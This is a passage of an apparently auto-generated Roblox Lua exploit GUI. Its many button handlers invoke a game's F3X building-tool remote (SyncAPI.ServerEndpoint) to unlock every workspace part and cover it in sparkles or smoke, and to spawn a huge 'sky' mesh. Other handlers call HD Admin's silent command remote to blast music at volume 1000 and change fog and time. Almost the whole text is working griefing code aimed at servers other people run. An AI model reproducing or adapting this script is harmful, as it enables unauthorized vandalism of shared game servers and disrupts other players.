						_(args)
					end
					function AddMesh(part)
						local args = {
							[1] = "CreateMeshes",
							[2] = {
								[1] = {
									["Part"] = part
								}
							}
						}
						_(args)
					end
		
					function SetMesh(part,meshid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://"..meshid
								}
							}
						}
						_(args)
					end
					function SetTexture(part, texid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = "rbxassetid://"..texid
								}
							}
						}
						_(args)
					end
					function SetName(part, stringg)
						local args = {
							[1] = "SetName",
							[2] = {
								[1] = workspace.Part
							},
							[3] = stringg
						}
		
						_(args)
					end
					function MeshResize(part,size)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						}
						_(args)
					end
					function Weld(part1, part2,lead)
						local args = {
							[1] = "CreateWelds",
							[2] = {
								[1] = part1,
								[2] = part2
							},
							[3] = lead
						}
						_(args)
		
					end
					function SetLocked(part,boolean)
						local args = {
							[1] = "SetLocked",
							[2] = {
								[1] = part
							},
							[3] = boolean
						}
						_(args)
					end
					function SetTrans(part,int)
						local args = {
							[1] = "SyncMaterial",
							[2] = {
								[1] = {
									["Part"] = part,
									["Transparency"] = int
								}
							}
						}
						_(args)
					end
					function CreateSpotlight(part)
						local args = {
							[1] = "CreateLights",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight"
								}
							}
						}
						_(args)
					end
					function SyncLighting(part,brightness)
						local args = {
							[1] = "SyncLighting",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight",
									["Brightness"] = brightness
								}
							}
						}
						_(args)
					end
					function AddSparkles(part)
						local args = {
							[1] = "CreateDecorations",
							[2] = {
								[1] = {
									["Part"] = part,
									["DecorationType"] = "Sparkles"
								}
							}
						}
						_(args)
					end
					function Sparkles()
						for i,v in game.Workspace:GetDescendants() do
							spawn(function()
								SetLocked(v,false)
								AddSparkles(v)
							end)
						end
					end
					Sparkles()
		
					local player = game.Players.LocalPlayer
		
				end)
		
				--97518021379547
			end
			coroutine.wrap(IUCK_fake_script)()
			local function DGIOM_fake_script() -- b_35.LocalScript 
				local script = Instance.new('LocalScript', b_35)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
		
					local player = game.Players.LocalPlayer
					local char = player.Character
					local tool
					for i,v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					for i,v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					--craaa
					remote = tool.SyncAPI.ServerEndpoint
					function _(args)
						remote:InvokeServer(unpack(args))
					end
					function SetCollision(part,boolean)
						local args = {
							[1] = "SyncCollision",
							[2] = {
								[1] = {
									["Part"] = part,
									["CanCollide"] = boolean
								}
							}
						}
						_(args)
					end
					function SetAnchor(boolean,part)
						local args = {
							[1] = "SyncAnchor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Anchored"] = boolean
								}
							}
						}
						_(args)
					end
					function CreatePart(cf,parent)
						local args = {
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						}
						_(args)
					end
					function DestroyPart(part)
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end
					function MovePart(part,cf)
						local args = {
							[1] = "SyncMove",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf
								}
							}
						}
						_(args)
					end
					function Resize(part,size,cf)
						local args = {
							[1] = "SyncResize",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf,
									["Size"] = size
								}
							}
						}
						_(args)
					end
					function AddMesh(part)
						local args = {
							[1] = "CreateMeshes",
							[2] = {
								[1] = {
									["Part"] = part
								}
							}
						}
						_(args)
					end
		
					function SetMesh(part,meshid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://"..meshid
								}
							}
						}
						_(args)
					end
					function SetTexture(part, texid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = "rbxassetid://"..texid
								}
							}
						}
						_(args)
					end
					function SetName(part, stringg)
						local args = {
							[1] = "SetName",
							[2] = {
								[1] = workspace.Part
							},
							[3] = stringg
						}
		
						_(args)
					end
					function MeshResize(part,size)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						}
						_(args)
					end
					function Weld(part1, part2,lead)
						local args = {
							[1] = "CreateWelds",
							[2] = {
								[1] = part1,
								[2] = part2
							},
							[3] = lead
						}
						_(args)
		
					end
					function SetLocked(part,boolean)
						local args = {
							[1] = "SetLocked",
							[2] = {
								[1] = part
							},
							[3] = boolean
						}
						_(args)
					end
					function SetTrans(part,int)
						local args = {
							[1] = "SyncMaterial",
							[2] = {
								[1] = {
									["Part"] = part,
									["Transparency"] = int
								}
							}
						}
						_(args)
					end
					function CreateSpotlight(part)
						local args = {
							[1] = "CreateLights",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight"
								}
							}
						}
						_(args)
					end
					function SyncLighting(part,brightness)
						local args = {
							[1] = "SyncLighting",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight",
									["Brightness"] = brightness
								}
							}
						}
						_(args)
					end
					function Smokes(part)
						local args = {
							[1] = "CreateDecorations",
							[2] = {
								[1] = {
									["Part"] = part,
									["DecorationType"] = "Smoke"
								}
							}
						}
						_(args)
					end
					function Smoke()
						for i,v in game.Workspace:GetDescendants() do
							spawn(function()
								SetLocked(v,false)
								Smokes(v)
							end)
						end
					end
					Smoke()
		
					local player = game.Players.LocalPlayer
		
				end)
		
				--97518021379547
			end
			coroutine.wrap(DGIOM_fake_script)()
			local function PQNDWI_fake_script() -- b_36.LocalScript 
				local script = Instance.new('LocalScript', b_36)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 107057266766632 ;pitch 0.1 ;volume 10")
				end)
			end
			coroutine.wrap(PQNDWI_fake_script)()
			local function PHMF_fake_script() -- b_37.LocalScript 
				local script = Instance.new('LocalScript', b_37)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local Players = game:GetService("Players")
		
					local RequestCommand = ReplicatedStorage
						:WaitForChild("HDAdminHDClient")
						.Signals.RequestCommandSilent
		
		
					RequestCommand:InvokeServer(";unfog")
					RequestCommand:InvokeServer(";fogcolor black")
					RequestCommand:InvokeServer(";time 0")
		
					wait(0.3)
		
					local player = Players.LocalPlayer
					local char = player.Character or player.CharacterAdded:Wait()
		
		
					local tool
					for _,v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					for _,v in ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
		
					if not tool then
						warn("No se encontró SyncAPI")
						return
					end
		
					local remote = tool.SyncAPI.ServerEndpoint
					local function _(args)
						remote:InvokeServer(unpack(args))
					end
		
					-- FUNCIONES F3X
					function CreatePart(cf,parent)
						_({
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						})
					end
		
					function AddMesh(part)
						_({
							[1] = "CreateMeshes",
							[2] = {
								[1] = {["Part"] = part}
							}
						})
					end
		
					function SetMesh(part,id)
						_({
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://"..id
								}
							}
						})
					end
		
					function SetTexture(part,id)
						_({
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = "rbxassetid://"..id
								}
							}
						})
					end
		
					function MeshResize(part,size)
						_({
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						})
					end
		
					function SetCollision(part,bool)
						_({
							[1] = "SyncCollision",
							[2] = {
								[1] = {
									["Part"] = part,
									["CanCollide"] = bool
								}
							}
						})
					end
		
					function SetLocked(part,bool)
						_({
							[1] = "SetLocked",
							[2] = {[1] = part},
							[3] = bool
						})
					end
		
					function SetName(part,name)
						_({
							[1] = "SetName",
							[2] = {[1] = part},
							[3] = name
						})
					end
		
					function SetVertexColor(part,vec)
						_({
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["VertexColor"] = vec
								}
							}
						})
					end
		
					function CreateSpotlight(part)
						_({
							[1] = "CreateLights",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight"
								}
							}
						})
					end
		
					function SyncLighting(part,brightness)
						_({
							[1] = "SyncLighting",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight",
									["Brightness"] = brightness
								}
							}
						})
					end
		
		
					function Sky(textureId)
						local hrp = char:WaitForChild("HumanoidRootPart")
		
						local x = math.floor(hrp.Position.X)
						local y = math.floor(hrp.Position.Y)
						local z = math.floor(hrp.Position.Z)
		
						CreatePart(
							CFrame.new(x,y,z) + Vector3.new(0,-10,0),
							workspace
						)
		
						for _,v in workspace:GetDescendants() do
							if v:IsA("BasePart")
								and math.floor(v.Position.X) == x
								and math.floor(v.Position.Z) == z then
		
								SetName(v,"sky")
								AddMesh(v)
								SetMesh(v,"111891702759441")
								SetTexture(v, textureId)
		
								MeshResize(v, Vector3.new(99999,99999,99999))
								SetCollision(v,false)
								SetLocked(v,true)
		
		
								SetVertexColor(v, Vector3.new(5,5,5))
		
		
								CreateSpotlight(v)
								SyncLighting(v,12)
							end
						end
					end
		
		
					Sky("118001970292194")
				end)
		
				--97518021379547
			end
			coroutine.wrap(PHMF_fake_script)()
			local function ACLYDOP_fake_script() -- e_2.LocalScript 
				local script = Instance.new('LocalScript', e_2)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 137739199475329 ;pitch 0.12 ;volume 1000")
				end)
			end
			coroutine.wrap(ACLYDOP_fake_script)()
			local function TWEC_fake_script() -- e_3.LocalScript 
				local script = Instance.new('LocalScript', e_3)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 81974406505102 ;pitch 0.12 ;volume 1000")
				end)
			end
			coroutine.wrap(TWEC_fake_script)()
			local function TKATH_fake_script() -- e_4.LocalScript 
				local script = Instance.new('LocalScript', e_4)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 92584083287479 ;pitch 0.21 ;volume 1000")
				end)
			end
			coroutine.wrap(TKATH_fake_script)()
			local function UXZAX_fake_script() -- e_5.LocalScript 
				local script = Instance.new('LocalScript', e_5)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 128622842743995 ;pitch 0.12 ;volume 1000")
				end)
			end
			coroutine.wrap(UXZAX_fake_script)()
			local function DEWQZG_fake_script() -- e_6.LocalScript 
				local script = Instance.new('LocalScript', e_6)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 73835470482241 ;pitch 0.3 ;volume 1000")
				end)
			end
			coroutine.wrap(DEWQZG_fake_script)()
			local function CGGYIY_fake_script() -- e_7.LocalScript 
				local script = Instance.new('LocalScript', e_7)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 70463237028195 ;pitch 0.24 ;volume 1000")
				end)
			end
			coroutine.wrap(CGGYIY_fake_script)()
			local function NPESDBE_fake_script() -- e_8.LocalScript 
				local script = Instance.new('LocalScript', e_8)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 76750962223675 ;pitch 0.12 ;volume 1000")
				end)
			end
			coroutine.wrap(NPESDBE_fake_script)()
			local function IXFOHYN_fake_script() -- e_9.LocalScript 
				local script = Instance.new('LocalScript', e_9)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 102295928741521 ;pitch 0.13 ;volume 1000")
				end)
			end
			coroutine.wrap(IXFOHYN_fake_script)()
			local function FEANHVP_fake_script() -- e_10.LocalScript 
				local script = Instance.new('LocalScript', e_10)
		
				local buttona = script.Parent
		
				buttona.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 106319482692675 ;pitch 0.1 ;volume 1000")
				end)
			end
			coroutine.wrap(FEANHVP_fake_script)()
			local function FQBTADV_fake_script() -- e_11.LocalScript 
				local script = Instance.new('LocalScript', e_11)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 123688374641839 ;pitch 0.16 ;volume 1000")
				end)
			end
			coroutine.wrap(FQBTADV_fake_script)()
			local function ILKRHTA_fake_script() -- e_12.LocalScript 
				local script = Instance.new('LocalScript', e_12)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 109904177360493 ;pitch 0.24 ;volume 1000")
				end)
			end
			coroutine.wrap(ILKRHTA_fake_script)()
			local function KVRRZER_fake_script() -- e_13.LocalScript 
				local script = Instance.new('LocalScript', e_13)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 129245295981728 ;pitch 0.115 ;volume 1000")
				end)
			end
			coroutine.wrap(KVRRZER_fake_script)()
			local function AVWJFAB_fake_script() -- e_14.LocalScript 
				local script = Instance.new('LocalScript', e_14)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 72420924397376 ;pitch 0.2 ;volume 1000")
				end)
			end
			coroutine.wrap(AVWJFAB_fake_script)()
			local function LHBJP_fake_script() -- e_15.LocalScript 
				local script = Instance.new('LocalScript', e_15)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 128327365740560 ;pitch 0.12 ;volume 1000")
				end)
			end
			coroutine.wrap(LHBJP_fake_script)()
			local function STCTP_fake_script() -- e_16.LocalScript 
				local script = Instance.new('LocalScript', e_16)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 106687731139619 ;pitch 0.12 ;volume 1000")
				end)
			end
			coroutine.wrap(STCTP_fake_script)()
			local function VUNVYS_fake_script() -- e_17.LocalScript 
				local script = Instance.new('LocalScript', e_17)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 94797081270081 ;pitch 0.2 ;volume 1000")
				end)
			end
			coroutine.wrap(VUNVYS_fake_script)()
			local function KIPR_fake_script() -- e_18.LocalScript 
				local script = Instance.new('LocalScript', e_18)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 72266196363368 ;pitch 0.27 ;volume 1000")
				end)
			end
			coroutine.wrap(KIPR_fake_script)()
			local function XLNZWH_fake_script() -- e_19.LocalScript 
				local script = Instance.new('LocalScript', e_19)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 99993460719133 ;pitch 0.2 ;volume 1000")
				end)
			end
			coroutine.wrap(XLNZWH_fake_script)()
			local function QOIEAD_fake_script() -- e_20.LocalScript 
				local script = Instance.new('LocalScript', e_20)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 113238741822041 ;pitch 0.17 ;volume 1000")
				end)
			end
			coroutine.wrap(QOIEAD_fake_script)()
			local function QRKVLTH_fake_script() -- e_21.LocalScript 
				local script = Instance.new('LocalScript', e_21)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 101381195264372 ;pitch 0.17 ;volume 1000")
				end)
			end
			coroutine.wrap(QRKVLTH_fake_script)()
			local function IWPQL_fake_script() -- e_22.LocalScript 
				local script = Instance.new('LocalScript', e_22)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 99974358068663 ;pitch 0.15 ;volume 1000")
				end)
			end
			coroutine.wrap(IWPQL_fake_script)()
			local function BCZTMF_fake_script() -- e_23.LocalScript 
				local script = Instance.new('LocalScript', e_23)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 93650961728068 ;pitch 0.15 ;volume 1000")
				end)
			end
			coroutine.wrap(BCZTMF_fake_script)()
			local function YGJWF_fake_script() -- e_24.LocalScript 
				local script = Instance.new('LocalScript', e_24)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 80515722989681 ;pitch 0.22 ;volume 1000")
				end)
			end
			coroutine.wrap(YGJWF_fake_script)()
			local function XKIGONC_fake_script() -- e_25.LocalScript 
				local script = Instance.new('LocalScript', e_25)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 92512466676196 ;pitch 0.11 ;volume 1000")
				end)
			end
			coroutine.wrap(XKIGONC_fake_script)()
			local function QXOEJFO_fake_script() -- e_26.LocalScript 
				local script = Instance.new('LocalScript', e_26)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 100754234156181  ;volume 1000")
				end)
			end
			coroutine.wrap(QXOEJFO_fake_script)()
			local function PXUTXTS_fake_script() -- e_27.LocalScript 
				local script = Instance.new('LocalScript', e_27)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 90947241993019 ;pitch 0.11 ;volume 1000")
				end)
			end
			coroutine.wrap(PXUTXTS_fake_script)()
			local function GYTEUFY_fake_script() -- e_28.LocalScript 
				local script = Instance.new('LocalScript', e_28)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 102278152256379 ;pitch 1.1 ;volume 1000")
				end)
			end
			coroutine.wrap(GYTEUFY_fake_script)()
			local function KGJVZ_fake_script() -- e_29.LocalScript 
				local script = Instance.new('LocalScript', e_29)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 140240856766854 ;pitch 0.2 ;volume 1000")
				end)
			end
			coroutine.wrap(KGJVZ_fake_script)()
			local function PYXR_fake_script() -- e_30.LocalScript 
				local script = Instance.new('LocalScript', e_30)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 137418375092271 ;pitch 0.11 ;volume 1000")
				end)
			end
			coroutine.wrap(PYXR_fake_script)()
			local function PNXERC_fake_script() -- e_31.LocalScript 
				local script = Instance.new('LocalScript', e_31)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 125974477780198 ;pitch 0.2 ;volume 1000")
				end)
			end
			coroutine.wrap(PNXERC_fake_script)()
			local function TZHFVF_fake_script() -- e_32.LocalScript 
				local script = Instance.new('LocalScript', e_32)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 85400095439616 ;pitch 0.2 ;volume 1000")
				end)
			end
			coroutine.wrap(TZHFVF_fake_script)()
			local function MNWNM_fake_script() -- e_33.LocalScript 
				local script = Instance.new('LocalScript', e_33)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 131426316419642 ;pitch 0.2 ;volume 1000")
				end)
			end
			coroutine.wrap(MNWNM_fake_script)()
			local function BKHIQD_fake_script() -- e_34.LocalScript 
				local script = Instance.new('LocalScript', e_34)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 136139539770810 ;pitch 0.2 ;volume 1000")
				end)
			end
			coroutine.wrap(BKHIQD_fake_script)()
			local function GNIDC_fake_script() -- e_35.LocalScript 
				local script = Instance.new('LocalScript', e_35)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 113786027626231 ;pitch 0.2 ;volume 1000")
				end)
			end
			coroutine.wrap(GNIDC_fake_script)()
			local function SFGGSA_fake_script() -- b_38.LocalScript 
				local script = Instance.new('LocalScript', b_38)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommand:InvokeServer(";music 100825376629691 ;pitch 1.05 ;volume 10")
				end)
			end
			coroutine.wrap(SFGGSA_fake_script)()
			local function DXCAEZU_fake_script() -- b_39.LocalScript 
				local script = Instance.new('LocalScript', b_39)
		
				local button = script.Parent
		
				button.MouseButton1Click:Connect(function()
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local Players = game:GetService("Players")
		
					local RequestCommand = ReplicatedStorage
						:WaitForChild("HDAdminHDClient")
						.Signals.RequestCommandSilent
		
		
					RequestCommand:InvokeServer(";unfog")
					RequestCommand:InvokeServer(";fogcolor black")
					RequestCommand:InvokeServer(";time 0")
		
					wait(0.3)
		
					local player = Players.LocalPlayer
					local char = player.Character or player.CharacterAdded:Wait()
		
		
					local tool
					for _,v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					for _,v in ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
		
					if not tool then
						warn("No se encontró SyncAPI")
						return
					end
		
					local remote = tool.SyncAPI.ServerEndpoint
					local function _(args)
						remote:InvokeServer(unpack(args))
					end
		
					-- FUNCIONES F3X
					function CreatePart(cf,parent)
						_({
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						})
					end
		
					function AddMesh(part)
						_({
							[1] = "CreateMeshes",
							[2] = {
								[1] = {["Part"] = part}
							}
						})
					end
		
					function SetMesh(part,id)
						_({
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://"..id
								}
							}
						})
					end
		
					function SetTexture(part,id)
						_({
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = "rbxassetid://"..id
								}
							}
						})
					end
		
					function MeshResize(part,size)
						_({
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						})
					end
		
					function SetCollision(part,bool)
						_({
							[1] = "SyncCollision",
							[2] = {
								[1] = {
									["Part"] = part,
									["CanCollide"] = bool
								}
							}
						})
					end
		
					function SetLocked(part,bool)
						_({
							[1] = "SetLocked",
							[2] = {[1] = part},
							[3] = bool
						})
					end
		
					function SetName(part,name)
						_({
							[1] = "SetName",
							[2] = {[1] = part},
							[3] = name
						})
					end
		
					function SetVertexColor(part,vec)
						_({
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["VertexColor"] = vec
								}
							}
						})
					end
		
					function CreateSpotlight(part)
						_({
							[1] = "CreateLights",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight"
								}
							}
						})
					end
		
					function SyncLighting(part,brightness)
						_({
							[1] = "SyncLighting",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight",
									["Brightness"] = brightness
								}
							}
						})
					end
		
		
					function Sky(textureId)
						local hrp = char:WaitForChild("HumanoidRootPart")
		
						local x = math.floor(hrp.Position.X)
						local y = math.floor(hrp.Position.Y)
						local z = math.floor(hrp.Position.Z)
		
						CreatePart(
							CFrame.new(x,y,z) + Vector3.new(0,-10,0),
							workspace
						)
		
						for _,v in workspace:GetDescendants() do
							if v:IsA("BasePart")
								and math.floor(v.Position.X) == x
								and math.floor(v.Position.Z) == z then
		
								SetName(v,"sky")
								AddMesh(v)
								SetMesh(v,"111891702759441")
								SetTexture(v, textureId)
		
